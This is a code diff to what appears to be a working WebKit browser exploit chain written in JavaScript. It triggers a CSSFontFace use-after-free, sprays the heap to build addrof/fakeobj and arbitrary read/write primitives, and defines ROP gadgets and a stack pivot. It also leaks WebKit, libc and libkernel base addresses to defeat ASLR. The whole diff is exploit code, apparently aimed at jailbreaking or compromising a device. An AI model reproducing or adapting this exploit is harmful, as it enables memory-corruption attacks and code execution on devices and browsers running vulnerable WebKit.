@@ -1,5 +1,5 @@
 import { version, logger } from "../utils.mjs";
-import { Offsets } from "./offsets.mjs";
+import { offsets } from "./offsets.mjs";
 
 //#region Constants
 
@@ -50,30 +50,29 @@ const helper = {
 };
 const mem = {
   allocs: new Set(),
-  fakes: new Map(),
   alloc(len, ptr = true) {
     const ab = new ArrayBuffer(len);
     this.allocs.add(ab);
-    return ptr ? ab.data : ab;
+    return ptr ? ab.data() : ab;
   },
   free(ab) {
     return this.allocs.delete(ab);
   },
   free_all() {
-    this.allocs.clear();
+    for (const ab of this.allocs) {
+      // fix to avoid crash
+      if (ab.hasOwnProperty("m_data")) {
+        const ab_addr = arw.addrof(ab);
 
-    // fix to avoid crash
-    for (const [data, ab] of this.fakes) {
-      const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
 
-      const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
-
-      arw.view(m_impl).setBigUint64(0, 0, true); // DeferrableRefCountedBase::m_refCount
-      arw.view(m_impl).setBigUint64(0x10, data, true); // m_contents.m_data
-      arw.view(m_impl).setInt32(0x24, 0, true); // m_contents.m_sizeInBytes
+        arw.view(m_impl).setBigUint64(0, 0n, true); // DeferrableRefCountedBase::m_refCount
+        arw.view(m_impl).setBigUint64(0x10, ab.m_data, true); // m_contents.m_data
+        arw.view(m_impl).setInt32(0x24, 0, true); // m_contents.m_sizeInBytes
+      }
     }
 
-    this.fakes.clear();
+    this.allocs.clear();
   },
   copy(dst, src, len) {
     const src_u8 = new Uint8Array(ArrayBuffer.from(src, len));
@@ -153,98 +152,11 @@ const rop = {
     arw.view(pivot_obj_addr).setBigUint64(0, empty_jscell, true);
   },
 };
-const gadgets = {
-  get RET() {
-    return webkit_base + Offsets.current.wk_RET;
+const gadgets = new Proxy(offsets, {
+  get(target, prop) {
+    return webkit_base + target[`wk_${prop}`];
   },
-  get LEAVE_RET() {
-    return webkit_base + Offsets.current.wk_LEAVE_RET;
-  },
-  get POP_R8_RET() {
-    return webkit_base + Offsets.current.wk_POP_R8_RET;
-  },
-  get POP_R9_RET() {
-    return webkit_base + Offsets.current.wk_POP_R9_RET;
-  },
-  get POP_R10_RET() {
-    return webkit_base + Offsets.current.wk_POP_R10_RET;
-  },
-  get POP_R11_RET() {
-    return webkit_base + Offsets.current.wk_POP_R11_RET;
-  },
-  get POP_R12_RET() {
-    return webkit_base + Offsets.current.wk_POP_R12_RET;
-  },
-  get POP_R13_RET() {
-    return webkit_base + Offsets.current.wk_POP_R13_RET;
-  },
-  get POP_R14_RET() {
-    return webkit_base + Offsets.current.wk_POP_R14_RET;
-  },
-  get POP_R15_RET() {
-    return webkit_base + Offsets.current.wk_POP_R15_RET;
-  },
-  get POP_RAX_RET() {
-    return webkit_base + Offsets.current.wk_POP_RAX_RET;
-  },
-  get POP_RBP_RET() {
-    return webkit_base + Offsets.current.wk_POP_RBP_RET;
-  },
-  get POP_RBX_RET() {
-    return webkit_base + Offsets.current.wk_POP_RBX_RET;
-  },
-  get POP_RCX_RET() {
-    return webkit_base + Offsets.current.wk_POP_RCX_RET;
-  },
-  get POP_RDI_RET() {
-    return webkit_base + Offsets.current.wk_POP_RDI_RET;
-  },
-  get POP_RDX_RET() {
-    return webkit_base + Offsets.current.wk_POP_RDX_RET;
-  },
-  get POP_RSI_RET() {
-    return webkit_base + Offsets.current.wk_POP_RSI_RET;
-  },
-  get POP_RSP_RET() {
-    return webkit_base + Offsets.current.wk_POP_RSP_RET;
-  },
-  get MOV_RAX_RCX_RET() {
-    return webkit_base + Offsets.current.wk_MOV_RAX_RCX_RET;
-  },
-  get MOV_QWORD_PTR_RDI_RAX_RET() {
-    return webkit_base + Offsets.current.wk_MOV_QWORD_PTR_RDI_RAX_RET;
-  },
-  get MOV_RAX_QWORD_PTR_RDI_RET() {
-    return webkit_base + Offsets.current.wk_MOV_RAX_QWORD_PTR_RDI_RET;
-  },
-  get PUSH_RAX_POP_RBP_RET() {
-    return webkit_base + Offsets.current.wk_PUSH_RAX_POP_RBP_RET;
-  },
-  get PUSH_RAX_PUSH_RBP_RET() {
-    return webkit_base + Offsets.current.wk_PUSH_RAX_PUSH_RBP_RET;
-  },
-  get PUSH_RBP_POP_RAX_RET() {
-    return webkit_base + Offsets.current.wk_PUSH_RBP_POP_RAX_RET;
-  },
-  get POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8() {
-    return webkit_base + Offsets.current.wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_8;
-  },
-  get POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40() {
-    return webkit_base + Offsets.current.wk_POP_RAX_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40;
-  },
-  get PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20() {
-    return webkit_base + Offsets.current.wk_PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20;
-  },
-  get MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18() {
-    return webkit_base + Offsets.current.wk_MOV_RSI_QWORD_PTR_RAX_10_CALL_QWORD_PTR_RAX_18;
-  },
-  get PUSH_RSI_JMP_QWORD_PTR_RAX() {
-    return webkit_base + Offsets.current.wk_PUSH_RSI_JMP_QWORD_PTR_RAX;
-  },
-  get MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38() {
-    return webkit_base + Offsets.current.wk_MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_38;
-  },
-};
+});
 //#endregion
 //#region Classes
 class SyscallError extends Error {
@@ -273,7 +185,7 @@ class Stack {
   }
 
   get sp() {
-    return this.view.buffer.data + BigInt(this.offset);
+    return this.view.buffer.data() + BigInt(this.offset);
   }
 
   /**
@@ -354,7 +266,7 @@ class Frame {
       throw new Error(`${name} not in frame !!`);
     }
 
-    return this.view.buffer.data + BigInt(this[name] * 8);
+    return this.view.buffer.data() + BigInt(this[name] * 8);
   }
 
   get_value(name) {
@@ -421,7 +333,7 @@ class Pivot {
   }
 
   get addr() {
-    return this.view.buffer.data;
+    return this.view.buffer.data();
   }
 
   prepare(sp) {
@@ -890,33 +802,25 @@ DataView.prototype.setBigInt64 =
     }
   };
 
-Object.defineProperty(ArrayBuffer.prototype, "data", {
-  get() {
-    const ab_addr = arw.addrof(this);
+ArrayBuffer.prototype.data = function () {
+  const ab_addr = arw.addrof(this);
 
-    const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
+  const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
 
-    return arw.view(m_impl).getBigUint64(0x10, true); // m_data
-  },
-  set(value) {
-    const ab_addr = arw.addrof(this);
-
-    const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
-
-    arw.view(m_impl).setBigUint64(0x10, value, true); // m_data
-  },
-});
+  return arw.view(m_impl).getBigUint64(0x10, true); // m_data
+};
 
 String.prototype.cstr = function () {
-  const ab = mem.alloc(this.length + 1);
-  const u8 = new Uint8Array(this.length + 1);
+  const ab = mem.alloc(this.length + 1, false);
+  const u8 = new Uint8Array(ab);
 
   for (let i = 0; i < this.length; i++) {
     u8[i] = this.charCodeAt(i) & 0xff;
   }
 
   u8[this.length] = 0;
-  return u8.buffer.data;
+
+  return ab.data();
 };
 //#endregion
 //#region Static
@@ -933,7 +837,7 @@ String.from = function (addr, max = 0x3fff) {
 
   const u8 = new Uint8Array(len);
 
-  mem.copy(u8.buffer.data, addr, len);
+  mem.copy(u8.buffer.data(), addr, len);
 
   return mem.btos(u8);
 };
@@ -943,24 +847,24 @@ ArrayBuffer.from = function (addr, len = -1) {
     throw new RangeError("Empty addr !!");
   }
 
-  const ab = new ArrayBuffer(0);
+  const ab = mem.alloc(0, false);
   const ab_addr = arw.addrof(ab);
 
   const m_impl = arw.view(ab_addr).getBigUint64(0x10, true);
   const m_data = arw.view(m_impl).getBigUint64(0x10, true);
 
+  ab.m_data = m_data;
+
   arw.view(m_impl).setBigUint64(0, 2n, true); // DeferrableRefCountedBase::m_refCount
   arw.view(m_impl).setBigUint64(0x10, addr, true); // m_contents.m_data
   arw.view(m_impl).setInt32(0x24, len, true); // m_contents.m_sizeInBytes
-
-  mem.fakes.set(m_data, ab); // fix later
 
   return ab;
 };
 //#endregion
 //#region Functions
 function errno() {
-  if (!("_error" in fn)) {
+  if (!fn.hasOwnProperty("_error")) {
     throw new Error("_error undefined !!");
   }
 
@@ -968,7 +872,7 @@ function errno() {
 }
 
 function strerror() {
-  if (!("_strerror" in fn)) {
+  if (!fn.hasOwnProperty("_strerror")) {
     throw new Error("strerror undefined !!");
   }
 
@@ -1045,11 +949,11 @@ async function init_arw() {
 
         // Spray ArrayBuffer with FontFace size and populate it so it survives crash
         for (let i = 0; i < abs.length; i++) {
-          const ab = new ArrayBuffer(Offsets.current.wk_CSSFontFace_sizeof);
+          const ab = new ArrayBuffer(offsets.wk_CSSFontFace_sizeof);
           const view = new DataView(ab);
 
           view.setBigUint64(8, 1n, true); // ref count
-          view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
+          view.setUint8(offsets.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
 
           abs[i] = ab;
         }
@@ -1083,6 +987,8 @@ async function init_arw() {
     uaf_font: undefined,
     oob_arr: undefined,
     obj_arr: undefined,
+    leak: { obj: 0 },
+    leak_addr: 0n,
     read(addr, size) {
       const ab = new ArrayBuffer(size);
       const u8 = new Uint8Array(ab);
@@ -1091,9 +997,9 @@ async function init_arw() {
       while (offset < size) {
         const ptr = addr + BigInt(offset);
 
-        uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
-        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
-        uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity
+        uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
+        uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
+        uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity
 
         // read m_tag since its std::array<char, 4> and skip the " chars
         for (let i = 1; i < 5; i++) {
@@ -1109,8 +1015,8 @@ async function init_arw() {
       return view.getBigUint64(0, true);
     },
     addrof(obj) {
-      this.obj_arr[0] = obj;
-      return helper.to_bigint(this.oob_arr[4]);
+      rw.leak.obj = obj;
+      return this.read8(this.leak_addr + 0x10n);
     },
     fakeobj(addr) {
       this.oob_arr[4] = helper.to_float(addr);
@@ -1151,8 +1057,8 @@ async function init_arw() {
 
   const uaf_view = new DataView(rw.uaf_ab);
 
-  const m_clients = uaf_view.getBigUint64(Offsets.current.wk_CSSFontFace_m_clients, true);
-  const m_wrapper = uaf_view.getBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, true);
+  const m_clients = uaf_view.getBigUint64(offsets.wk_CSSFontFace_m_clients, true);
+  const m_wrapper = uaf_view.getBigUint64(offsets.wk_CSSFontFace_m_wrapper, true);
 
   logger.debug(`m_clients: ${m_clients.hex()}`);
   logger.debug(`m_wrapper: ${m_wrapper.hex()}`);
@@ -1163,34 +1069,16 @@ async function init_arw() {
   const m_backing = rw.read8(m_wrapper_m_ptr + 0x28n);
   logger.debug(`m_backing: ${m_backing.hex()}`);
 
-  const views = [];
   const props = [];
   const marker = 0xfffe000041414141n;
-  const marker_ffs = 0xfffe000042424242n;
-
-  // Spray ArrayWithDoubles and ArrayWithContiguous arrays to be used for addrof/fakeobj
-  for (let i = 0; i < spray_count; i++) {
-    views.push(new Array(1.1, 1.1));
-    views.push(new Array({}, {}));
-    views.push(new FontFace("spray", "", {}));
-  }
 
   // Spray marker and target JS object as props
-  for (let i = 0; i < views.length; i++) {
-    if (i % 3 === 0) {
-      props.push({ value: Number(marker.lo()) });
-      props.push({ value: views[i] });
-    }
-    if (i % 3 === 2) {
-      props.push({ value: Number(marker_ffs.lo()) });
-      props.push({ value: views[i] });
-    }
+  for (let i = 0; i < spray_count; i++) {
+    props.push({ value: Number(marker.lo()) });
+    props.push({ value: rw.leak });
   }
 
   let found = false;
-  let found_ffs = false;
-  let m_thread = undefined;
-  let oob_arr_indexing_header_addr = undefined;
   let start = m_backing.alignUp(0x4000n);
   while (true) {
     // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
@@ -1199,84 +1087,75 @@ async function init_arw() {
     const dv = new DataView(rw.read(start, 0x100));
 
     for (let i = 0; i < dv.byteLength / 8; i += 8) {
-      if (!found && dv.getBigUint64(i, true) === marker) {
+      if (dv.getBigUint64(i, true) === marker) {
         const marker = start + BigInt(i * 8);
         logger.info(`Found Array marker at ${marker.hex()} !!`);
 
-        const oob_arr_addr = rw.read8(marker + 0x20n);
-        logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);
-
-        const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
-        logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);
-
-        oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
-        logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);
-
-        const oob_arr_indexing_header = rw.read8(oob_arr_indexing_header_addr);
-
-        if (oob_arr_indexing_header.lo() !== 2n || oob_arr_indexing_header.htol() !== 3n) {
-          continue;
-        }
+        rw.leak_addr = rw.read8(marker + 0x20n);
+        logger.debug(`rw_leak_addr: ${rw.leak_addr.hex()}`);
 
         found = true;
-      }
-
-      if (!found_ffs && dv.getBigUint64(i, true) === marker_ffs) {
-        const marker = start + BigInt(i * 8);
-        logger.info(`Found FontFace marker at ${marker.hex()} !!`);
-
-        const js_font_addr = rw.read8(marker + 0x20n);
-        logger.debug(`js_font_addr: ${js_font_addr.hex()}`);
-
-        const font_addr = rw.read8(js_font_addr + 0x18n);
-        logger.debug(`font_addr: ${font_addr.hex()}`);
-
-        const css_font_addr = rw.read8(font_addr + 0x28n);
-        logger.debug(`css_font_addr: ${css_font_addr.hex()}`);
-
-        m_thread = rw.read8(css_font_addr + 0xa8n);
-        logger.debug(`m_thread: ${m_thread.hex()}`);
-
-        found_ffs = true;
-      }
-
-      if (found && found_ffs) {
         break;
       }
     }
 
-    if (found && found_ffs) {
+    if (found) {
       break;
     }
 
     start += 0x100n;
   }
 
+  const dummy_font = new FontFace("spray", "", {});
+  const dummy_font_addr = rw.addrof(dummy_font);
+  logger.debug(`dummy_font_addr: ${dummy_font_addr.hex()}`);
+
+  const font_addr = rw.read8(dummy_font_addr + 0x18n);
+  logger.debug(`font_addr: ${font_addr.hex()}`);
+
+  const css_font_addr = rw.read8(font_addr + 0x28n);
+  logger.debug(`css_font_addr: ${css_font_addr.hex()}`);
+
+  const m_thread = rw.read8(css_font_addr + BigInt(offsets.wk_CSSFontFace_m_thread));
+  logger.debug(`m_thread: ${m_thread.hex()}`);
+
+  rw.oob_arr = new Array(1.1, 1.1);
+  rw.obj_arr = new Array({}, {});
+
+  const oob_arr_addr = rw.addrof(rw.oob_arr);
+  logger.debug(`oob_arr_addr: ${oob_arr_addr.hex()}`);
+  
+  const oob_arr_butterfly = rw.read8(oob_arr_addr + 8n);
+  logger.debug(`oob_arr_butterfly: ${oob_arr_butterfly.hex()}`);
+
+  const oob_arr_indexing_header_addr = oob_arr_butterfly - 8n;
+  logger.debug(`oob_arr_indexing_header_addr: ${oob_arr_indexing_header_addr.hex()}`);
+
   const oob_arr_indexing_header_before = rw.read8(oob_arr_indexing_header_addr);
   logger.debug(`oob_arr_indexing_header before: ${oob_arr_indexing_header_before.hex()}`);
 
   // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
-  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure
+  uaf_view.setUint8(offsets.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure
 
   document.fonts.add(rw.uaf_font);
 
   // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call, place oob_arr's indexing_header into m_families and m_wrapper so it deref by 1 then 2 and underflows
   uaf_view.setBigUint64(8, 1n, true); // ref count
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true); // m_families
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true); // m_featureSettings.m_buffer
-  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_size, 0, true); // m_featureSettings.m_size
-  uaf_view.setInt32(Offsets.current.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true); // m_featureSettings.m_capacity
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, 0n, true); // m_clients
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true); // m_wrapper
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_thread, m_thread, true); // m_thread
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_families, oob_arr_indexing_header_addr, true); // m_families
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_featureSettings_m_buffer, 0n, true); // m_featureSettings.m_buffer
+  uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_size, 0, true); // m_featureSettings.m_size
+  uaf_view.setInt32(offsets.wk_CSSFontFace_m_featureSettings_m_capacity, 0, true); // m_featureSettings.m_capacity
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_clients, 0n, true); // m_clients
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_wrapper, oob_arr_indexing_header_addr, true); // m_wrapper
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_thread, m_thread, true); // m_thread
 
   document.fonts.delete(rw.uaf_font);
 
   // Restore UAF FontFace to be able to use rw.read again
   uaf_view.setBigUint64(8, 2n, true); // ref count
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
-  uaf_view.setBigUint64(Offsets.current.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
-  uaf_view.setUint8(Offsets.current.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
+  uaf_view.setBigUint64(offsets.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
+  uaf_view.setUint8(offsets.wk_CSSFontFace_m_status, 3); // m_status: Status::Success
 
   const oob_arr_indexing_header_after = rw.read8(oob_arr_indexing_header_addr);
   logger.debug(`oob_arr_indexing_header after: ${oob_arr_indexing_header_after.hex()}`);
@@ -1285,21 +1164,8 @@ async function init_arw() {
     throw new Error("Unable to underflow oob_arr's indexing_header !!");
   }
 
-  for (let i = 0; i < views.length; i += 3) {
-    if (views[i].length === 0xffffffff) {
-      logger.info(`Found oob_arr at views[${i}] !!`);
-      rw.oob_arr = views[i];
-      rw.obj_arr = views[i + 1];
-      break;
-    }
-  }
-
-  if (rw.oob_arr === undefined) {
-    throw new Error("Unable to find oob_arr !!");
-  }
-
   arw.leak_addr = rw.addrof(arw.leak);
-  logger.debug(`leak_addr: ${arw.leak_addr.hex()}`);
+  logger.debug(`arw_leak_addr: ${arw.leak_addr.hex()}`);
 
   const dummy_view = new Uint32Array(1);
   const dummy_view_addr = rw.addrof(dummy_view);
@@ -1343,7 +1209,7 @@ async function init_arw() {
   arw.view(victim_addr).setInt32(0x18, -1, true);
 
   // Cleanup container
-  //delete container.jscell; // FIXME: crashes, need to figure out why
+  delete container.jscell;
   delete container.butterfly;
   delete container.vector;
   delete container.length_and_flags;
@@ -1366,19 +1232,19 @@ function init_aslr() {
   const m_constructor = arw.view(m_executableOrRareData).getBigUint64(0x30, true);
   logger.debug(`m_constructor: ${m_constructor.hex()}`);
 
-  webkit_base = m_function - Offsets.current.wk_expm1_builtin;
+  webkit_base = m_function - offsets.wk_expm1_builtin;
   logger.info(`webkit base: ${webkit_base.hex()}`);
 
-  strerror_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp_strerror, true);
+  strerror_addr = arw.view(webkit_base).getBigUint64(offsets.wk___imp_strerror, true);
   logger.debug(`strerror_addr: ${strerror_addr.hex()}`);
 
-  libc_base = strerror_addr - Offsets.current.c_strerror;
+  libc_base = strerror_addr - offsets.c_strerror;
   logger.info(`libc base: ${libc_base.hex()}`);
 
-  _error_addr = arw.view(webkit_base).getBigUint64(Offsets.current.wk___imp___error, true);
+  _error_addr = arw.view(webkit_base).getBigUint64(offsets.wk___imp___error, true);
   logger.debug(`_error_addr: ${_error_addr.hex()}`);
 
-  libkernel_base = _error_addr - Offsets.current.k__error;
+  libkernel_base = _error_addr - offsets.k__error;
   logger.info(`libkernel base: ${libkernel_base.hex()}`);
 
   logger.info("Achieved ASLR...");
